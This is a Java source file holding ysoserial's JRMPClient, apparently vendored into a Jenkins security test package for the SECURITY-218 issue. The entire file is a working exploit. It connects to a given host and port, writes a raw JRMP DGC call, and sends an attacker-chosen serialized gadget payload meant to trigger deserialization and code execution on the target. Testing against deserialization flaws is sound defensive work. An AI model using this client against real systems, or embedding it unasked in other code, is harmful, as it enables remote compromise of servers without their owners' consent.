/*
 * The MIT License
 *
 * Copyright (c) 2013 Chris Frohoff
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package jenkins.security.security218.ysoserial.exploit;


import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.UnknownHostException;

import javax.net.SocketFactory;

import sun.rmi.transport.TransportConstants;
import jenkins.security.security218.ysoserial.payloads.ObjectPayload.Utils;


/**
 * Generic JRMP client
 * 
 * Pretty much the same thing as {@link RMIRegistryExploit} but 
 * - targeting the remote DGC (Distributed Garbage Collection, always there if there is a listener)
 * - not deserializing anything (so you don't get yourself exploited ;))
 * 
 * @author mbechler
 *
 */
@SuppressWarnings ( {
    "restriction"
} )
public class JRMPClient {

    public static final void main ( final String[] args ) {
        if ( args.length < 4 ) {
            System.err.println(JRMPClient.class.getName() + " <host> <port> <payload_type> <payload_arg>");
            System.exit(-1);
        }

        Object payloadObject = Utils.makePayloadObject(args[2], args[3]);
        String hostname = args[ 0 ];
        int port = Integer.parseInt(args[ 1 ]);
        try {
            System.err.println(String.format("* Opening JRMP socket %s:%d", hostname, port));
            makeDGCCall(hostname, port, payloadObject);
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
        Utils.releasePayload(args[2], payloadObject);
    }

    public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException {
        InetSocketAddress isa = new InetSocketAddress(hostname, port);
        Socket s = null;
        DataOutputStream dos = null;
        try {
            s = SocketFactory.getDefault().createSocket(hostname, port);
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            OutputStream os = s.getOutputStream();
            dos = new DataOutputStream(os);

            dos.writeInt(TransportConstants.Magic);
            dos.writeShort(TransportConstants.Version);
            dos.writeByte(TransportConstants.SingleOpProtocol);

            dos.write(TransportConstants.Call);

            @SuppressWarnings ( "resource" )
            final ObjectOutputStream objOut = new MarshalOutputStream(dos);

            objOut.writeLong(2); // DGC
            objOut.writeInt(0);
            objOut.writeLong(0);
            objOut.writeShort(0);

            objOut.writeInt(1); // dirty
            objOut.writeLong(-669196253586618813L);
            
            objOut.writeObject(payloadObject);

            os.flush();
        }
        finally {
            if ( dos != null ) {
                dos.close();
            }
            if ( s != null ) {
                s.close();
            }
        }
    }

    static final class MarshalOutputStream extends ObjectOutputStream {
        
        
        private URL sendUrl;

        public MarshalOutputStream (OutputStream out, URL u) throws IOException {
            super(out);
            this.sendUrl = u;
        }

        MarshalOutputStream ( OutputStream out ) throws IOException {
            super(out);
        }

        @Override
        protected void annotateClass ( Class<?> cl ) throws IOException {
            if ( this.sendUrl != null ) {
                writeObject(this.sendUrl.toString());
            } else if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
                writeObject(null);
            }
            else {
                URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
                String cb = "";
                
                for ( URL u : us ) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }


        /**
         * Serializes a location from which to load the specified class.
         */
        @Override
        protected void annotateProxyClass ( Class<?> cl ) throws IOException {
            annotateClass(cl);
        }
    }

 
}
